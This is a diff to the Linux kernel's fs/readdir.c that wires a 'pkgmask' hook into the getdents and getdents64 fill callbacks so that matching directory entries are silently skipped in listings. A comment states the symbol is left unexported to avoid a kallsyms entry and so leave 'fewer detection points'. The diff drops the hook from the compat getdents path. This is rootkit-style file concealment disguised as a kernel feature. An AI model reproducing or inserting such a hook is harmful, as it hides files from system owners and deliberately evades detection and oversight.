@@ -3,8 +3,13 @@
  *  linux/fs/readdir.c
  *
  *  Copyright (C) 1995  Linus Torvalds
+ *
+ *  pkgmask (v3.2): filldir64 / filldir weak hook.
+ *  The weak default below returns false; the built-in pkgmask module
+ *  provides a strong definition that filters directory entries by
+ *  (parent dir dev, ino) + entry name.  Hiding returns true without
+ *  writing the entry, so the listing stays compact and offsets valid.
  */
-
 #include <linux/stddef.h>
 #include <linux/kernel.h>
 #include <linux/export.h>
@@ -21,14 +26,14 @@
 #include <linux/unistd.h>
 #include <linux/compat.h>
 #include <linux/uaccess.h>
-
 #include <asm/unaligned.h>
 
 /*
- * pkgmask v3.2: weak default entry filter.
- * The pkgmask built-in module (obj-y) provides a strong definition that
- * hides directory entries for configured package names from configured
- * UIDs.  The weak default keeps the core kernel linkable without it.
+ * pkgmask: weak default (never hides anything unless the built-in
+ * pkgmask module overrides it with a strong definition in vmlinux).
+ * No EXPORT_SYMBOL here: the strong definition is built-in too, so
+ * the linker resolves the weak reference to the strong symbol and no
+ * extra kallsyms entry is created (fewer detection points).
  */
 bool __weak pmk_filter_dirent(const char *name, const struct inode *dir)
 {
@@ -47,7 +52,6 @@ int wrap_directory_iterator(struct file *file,
 {
 	struct inode *inode = file_inode(file);
 	int ret;
-
 	/*
 	 * We'd love to have an 'inode_upgrade_trylock()' operation,
 	 * see the comment in mmap_upgrade_trylock() in mm/memory.c.
@@ -65,7 +69,6 @@ int wrap_directory_iterator(struct file *file,
 	 */
 	up_read(&inode->i_rwsem);
 	down_write(&inode->i_rwsem);
-
 	/*
 	 * Since we dropped the inode lock, we should do the
 	 * DEADDIR test again. See 'iterate_dir()' below.
@@ -76,12 +79,10 @@ int wrap_directory_iterator(struct file *file,
 	ret = -ENOENT;
 	if (!IS_DEADDIR(inode))
 		ret = iter(file, ctx);
-
 	downgrade_write(&inode->i_rwsem);
 	return ret;
 }
 EXPORT_SYMBOL(wrap_directory_iterator);
-
 /*
  * Note the "unsafe_put_user() semantics: we goto a
  * label for errors.
@@ -93,24 +94,18 @@ EXPORT_SYMBOL(wrap_directory_iterator);
 	unsafe_put_user(0, dst+len, label);			\
 	unsafe_copy_to_user(dst, src, len, label);		\
 } while (0)
-
-
 int iterate_dir(struct file *file, struct dir_context *ctx)
 {
 	struct inode *inode = file_inode(file);
 	int res = -ENOTDIR;
-
 	if (!file->f_op->iterate_shared)
 		goto out;
-
 	res = security_file_permission(file, MAY_READ);
 	if (res)
 		goto out;
-
 	res = down_read_killable(&inode->i_rwsem);
 	if (res)
 		goto out;
-
 	res = -ENOENT;
 	if (!IS_DEADDIR(inode)) {
 		ctx->pos = file->f_pos;
@@ -124,7 +119,6 @@ out:
 	return res;
 }
 EXPORT_SYMBOL(iterate_dir);
-
 /*
  * POSIX says that a dirent name cannot contain NULL or a '/'.
  *
@@ -162,7 +156,6 @@ static int verify_dirent_name(const char *name, int len)
 		return -EIO;
 	return 0;
 }
-
 /*
  * Traditional linux readdir() handling..
  *
@@ -171,22 +164,18 @@ static int verify_dirent_name(const char *name, int len)
  * anyway. Thus the special "fillonedir()" function for that
  * case (the low-level handlers don't need to care about this).
  */
-
 #ifdef __ARCH_WANT_OLD_READDIR
-
 struct old_linux_dirent {
 	unsigned long	d_ino;
 	unsigned long	d_offset;
 	unsigned short	d_namlen;
 	char		d_name[];
 };
-
 struct readdir_callback {
 	struct dir_context ctx;
 	struct old_linux_dirent __user * dirent;
 	int result;
 };
-
 static bool fillonedir(struct dir_context *ctx, const char *name, int namlen,
 		      loff_t offset, u64 ino, unsigned int d_type)
 {
@@ -194,7 +183,6 @@ static bool fillonedir(struct dir_context *ctx, const char *name, int namlen,
 		container_of(ctx, struct readdir_callback, ctx);
 	struct old_linux_dirent __user * dirent;
 	unsigned long d_ino;
-
 	if (buf->result)
 		return false;
 	buf->result = verify_dirent_name(name, namlen);
@@ -223,7 +211,6 @@ efault:
 	buf->result = -EFAULT;
 	return false;
 }
-
 SYSCALL_DEFINE3(old_readdir, unsigned int, fd,
 		struct old_linux_dirent __user *, dirent, unsigned int, count)
 {
@@ -233,20 +220,15 @@ SYSCALL_DEFINE3(old_readdir, unsigned int, fd,
 		.ctx.actor = fillonedir,
 		.dirent = dirent
 	};
-
 	if (!f.file)
 		return -EBADF;
-
 	error = iterate_dir(f.file, &buf.ctx);
 	if (buf.result)
 		error = buf.result;
-
 	fdput_pos(f);
 	return error;
 }
-
 #endif /* __ARCH_WANT_OLD_READDIR */
-
 /*
  * New, all-improved, singing, dancing, iBCS2-compliant getdents()
  * interface. 
@@ -257,16 +239,14 @@ struct linux_dirent {
 	unsigned short	d_reclen;
 	char		d_name[];
 };
-
 struct getdents_callback {
 	struct dir_context ctx;
 	struct linux_dirent __user * current_dir;
 	int prev_reclen;
 	int count;
 	int error;
-	const struct inode *dir;	/* pkgmask v3.2 */
+	const struct inode *dir;	/* pkgmask: parent inode */
 };
-
 static bool filldir(struct dir_context *ctx, const char *name, int namlen,
 		   loff_t offset, u64 ino, unsigned int d_type)
 {
@@ -274,13 +254,13 @@ static bool filldir(struct dir_context *ctx, const char *name, int namlen,
 	struct getdents_callback *buf =
 		container_of(ctx, struct getdents_callback, ctx);
 	unsigned long d_ino;
-
-	/* pkgmask v3.2: drop hidden entries at the source */
-	if (pmk_filter_dirent(name, buf->dir))
-		return true;
 	int reclen = ALIGN(offsetof(struct linux_dirent, d_name) + namlen + 2,
 		sizeof(long));
 	int prev_reclen;
+
+	/* pkgmask: hide matching entries (skip without writing) */
+	if (pmk_filter_dirent(name, buf->dir))
+		return true;
 
 	buf->error = verify_dirent_name(name, namlen);
 	if (unlikely(buf->error))
@@ -300,7 +280,6 @@ static bool filldir(struct dir_context *ctx, const char *name, int namlen,
 	prev = (void __user *) dirent - prev_reclen;
 	if (!user_write_access_begin(prev, reclen + prev_reclen))
 		goto efault;
-
 	/* This might be 'dirent->d_off', but if so it will get overwritten */
 	unsafe_put_user(offset, &prev->d_off, efault_end);
 	unsafe_put_user(d_ino, &dirent->d_ino, efault_end);
@@ -308,7 +287,6 @@ static bool filldir(struct dir_context *ctx, const char *name, int namlen,
 	unsafe_put_user(d_type, (char __user *) dirent + reclen - 1, efault_end);
 	unsafe_copy_dirent_name(dirent->d_name, name, namlen, efault_end);
 	user_write_access_end();
-
 	buf->current_dir = (void __user *)dirent + reclen;
 	buf->prev_reclen = reclen;
 	buf->count -= reclen;
@@ -319,7 +297,6 @@ efault:
 	buf->error = -EFAULT;
 	return false;
 }
-
 SYSCALL_DEFINE3(getdents, unsigned int, fd,
 		struct linux_dirent __user *, dirent, unsigned int, count)
 {
@@ -328,22 +305,18 @@ SYSCALL_DEFINE3(getdents, unsigned int, fd,
 		.ctx.actor = filldir,
 		.count = count,
 		.current_dir = dirent,
-		.dir = NULL,		/* pkgmask v3.2 */
+		.dir = file_inode(f.file),
 	};
 	int error;
-
 	f = fdget_pos(fd);
 	if (!f.file)
 		return -EBADF;
-
-	buf.dir = file_inode(f.file);	/* pkgmask v3.2 */
 	error = iterate_dir(f.file, &buf.ctx);
 	if (error >= 0)
 		error = buf.error;
 	if (buf.prev_reclen) {
 		struct linux_dirent __user * lastdirent;
 		lastdirent = (void __user *)buf.current_dir - buf.prev_reclen;
-
 		if (put_user(buf.ctx.pos, &lastdirent->d_off))
 			error = -EFAULT;
 		else
@@ -352,16 +325,14 @@ SYSCALL_DEFINE3(getdents, unsigned int, fd,
 	fdput_pos(f);
 	return error;
 }
-
 struct getdents_callback64 {
 	struct dir_context ctx;
 	struct linux_dirent64 __user * current_dir;
 	int prev_reclen;
 	int count;
 	int error;
-	const struct inode *dir;	/* pkgmask v3.2 */
+	const struct inode *dir;	/* pkgmask: parent inode */
 };
-
 static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 		     loff_t offset, u64 ino, unsigned int d_type)
 {
@@ -370,11 +341,11 @@ static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 		container_of(ctx, struct getdents_callback64, ctx);
 	int reclen = ALIGN(offsetof(struct linux_dirent64, d_name) + namlen + 1,
 		sizeof(u64));
+	int prev_reclen;
 
-	/* pkgmask v3.2: drop hidden entries at the source */
+	/* pkgmask: hide matching entries (skip without writing) */
 	if (pmk_filter_dirent(name, buf->dir))
 		return true;
-	int prev_reclen;
 
 	buf->error = verify_dirent_name(name, namlen);
 	if (unlikely(buf->error))
@@ -389,7 +360,6 @@ static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 	prev = (void __user *)dirent - prev_reclen;
 	if (!user_write_access_begin(prev, reclen + prev_reclen))
 		goto efault;
-
 	/* This might be 'dirent->d_off', but if so it will get overwritten */
 	unsafe_put_user(offset, &prev->d_off, efault_end);
 	unsafe_put_user(ino, &dirent->d_ino, efault_end);
@@ -397,19 +367,16 @@ static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 	unsafe_put_user(d_type, &dirent->d_type, efault_end);
 	unsafe_copy_dirent_name(dirent->d_name, name, namlen, efault_end);
 	user_write_access_end();
-
 	buf->prev_reclen = reclen;
 	buf->current_dir = (void __user *)dirent + reclen;
 	buf->count -= reclen;
 	return true;
-
 efault_end:
 	user_write_access_end();
 efault:
 	buf->error = -EFAULT;
 	return false;
 }
-
 SYSCALL_DEFINE3(getdents64, unsigned int, fd,
 		struct linux_dirent64 __user *, dirent, unsigned int, count)
 {
@@ -418,22 +385,18 @@ SYSCALL_DEFINE3(getdents64, unsigned int, fd,
 		.ctx.actor = filldir64,
 		.count = count,
 		.current_dir = dirent,
-		.dir = NULL,		/* pkgmask v3.2 */
+		.dir = file_inode(f.file),
 	};
 	int error;
-
 	f = fdget_pos(fd);
 	if (!f.file)
 		return -EBADF;
-
-	buf.dir = file_inode(f.file);	/* pkgmask v3.2 */
 	error = iterate_dir(f.file, &buf.ctx);
 	if (error >= 0)
 		error = buf.error;
 	if (buf.prev_reclen) {
 		struct linux_dirent64 __user * lastdirent;
 		typeof(lastdirent->d_off) d_off = buf.ctx.pos;
-
 		lastdirent = (void __user *) buf.current_dir - buf.prev_reclen;
 		if (put_user(d_off, &lastdirent->d_off))
 			error = -EFAULT;
@@ -443,7 +406,6 @@ SYSCALL_DEFINE3(getdents64, unsigned int, fd,
 	fdput_pos(f);
 	return error;
 }
-
 #ifdef CONFIG_COMPAT
 struct compat_old_linux_dirent {
 	compat_ulong_t	d_ino;
@@ -451,13 +413,11 @@ struct compat_old_linux_dirent {
 	unsigned short	d_namlen;
 	char		d_name[];
 };
-
 struct compat_readdir_callback {
 	struct dir_context ctx;
 	struct compat_old_linux_dirent __user *dirent;
 	int result;
 };
-
 static bool compat_fillonedir(struct dir_context *ctx, const char *name,
 			     int namlen, loff_t offset, u64 ino,
 			     unsigned int d_type)
@@ -466,7 +426,6 @@ static bool compat_fillonedir(struct dir_context *ctx, const char *name,
 		container_of(ctx, struct compat_readdir_callback, ctx);
 	struct compat_old_linux_dirent __user *dirent;
 	compat_ulong_t d_ino;
-
 	if (buf->result)
 		return false;
 	buf->result = verify_dirent_name(name, namlen);
@@ -495,7 +454,6 @@ efault:
 	buf->result = -EFAULT;
 	return false;
 }
-
 COMPAT_SYSCALL_DEFINE3(old_readdir, unsigned int, fd,
 		struct compat_old_linux_dirent __user *, dirent, unsigned int, count)
 {
@@ -505,34 +463,27 @@ COMPAT_SYSCALL_DEFINE3(old_readdir, unsigned int, fd,
 		.ctx.actor = compat_fillonedir,
 		.dirent = dirent
 	};
-
 	if (!f.file)
 		return -EBADF;
-
 	error = iterate_dir(f.file, &buf.ctx);
 	if (buf.result)
 		error = buf.result;
-
 	fdput_pos(f);
 	return error;
 }
-
 struct compat_linux_dirent {
 	compat_ulong_t	d_ino;
 	compat_ulong_t	d_off;
 	unsigned short	d_reclen;
 	char		d_name[];
 };
-
 struct compat_getdents_callback {
 	struct dir_context ctx;
 	struct compat_linux_dirent __user *current_dir;
 	int prev_reclen;
 	int count;
 	int error;
-	const struct inode *dir;	/* pkgmask v3.2 */
 };
-
 static bool compat_filldir(struct dir_context *ctx, const char *name, int namlen,
 		loff_t offset, u64 ino, unsigned int d_type)
 {
@@ -540,14 +491,9 @@ static bool compat_filldir(struct dir_context *ctx, const char *name, int namlen
 	struct compat_getdents_callback *buf =
 		container_of(ctx, struct compat_getdents_callback, ctx);
 	compat_ulong_t d_ino;
-
-	/* pkgmask v3.2: drop hidden entries at the source */
-	if (pmk_filter_dirent(name, buf->dir))
-		return true;
 	int reclen = ALIGN(offsetof(struct compat_linux_dirent, d_name) +
 		namlen + 2, sizeof(compat_long_t));
 	int prev_reclen;
-
 	buf->error = verify_dirent_name(name, namlen);
 	if (unlikely(buf->error))
 		return false;
@@ -566,14 +512,12 @@ static bool compat_filldir(struct dir_context *ctx, const char *name, int namlen
 	prev = (void __user *) dirent - prev_reclen;
 	if (!user_write_access_begin(prev, reclen + prev_reclen))
 		goto efault;
-
 	unsafe_put_user(offset, &prev->d_off, efault_end);
 	unsafe_put_user(d_ino, &dirent->d_ino, efault_end);
 	unsafe_put_user(reclen, &dirent->d_reclen, efault_end);
 	unsafe_put_user(d_type, (char __user *) dirent + reclen - 1, efault_end);
 	unsafe_copy_dirent_name(dirent->d_name, name, namlen, efault_end);
 	user_write_access_end();
-
 	buf->prev_reclen = reclen;
 	buf->current_dir = (void __user *)dirent + reclen;
 	buf->count -= reclen;
@@ -584,7 +528,6 @@ efault:
 	buf->error = -EFAULT;
 	return false;
 }
-
 COMPAT_SYSCALL_DEFINE3(getdents, unsigned int, fd,
 		struct compat_linux_dirent __user *, dirent, unsigned int, count)
 {
@@ -592,23 +535,18 @@ COMPAT_SYSCALL_DEFINE3(getdents, unsigned int, fd,
 	struct compat_getdents_callback buf = {
 		.ctx.actor = compat_filldir,
 		.current_dir = dirent,
-		.count = count,
-		.dir = NULL,		/* pkgmask v3.2 */
+		.count = count
 	};
 	int error;
-
 	f = fdget_pos(fd);
 	if (!f.file)
 		return -EBADF;
-
-	buf.dir = file_inode(f.file);	/* pkgmask v3.2 */
 	error = iterate_dir(f.file, &buf.ctx);
 	if (error >= 0)
 		error = buf.error;
 	if (buf.prev_reclen) {
 		struct compat_linux_dirent __user * lastdirent;
 		lastdirent = (void __user *)buf.current_dir - buf.prev_reclen;
-
 		if (put_user(buf.ctx.pos, &lastdirent->d_off))
 			error = -EFAULT;
 		else
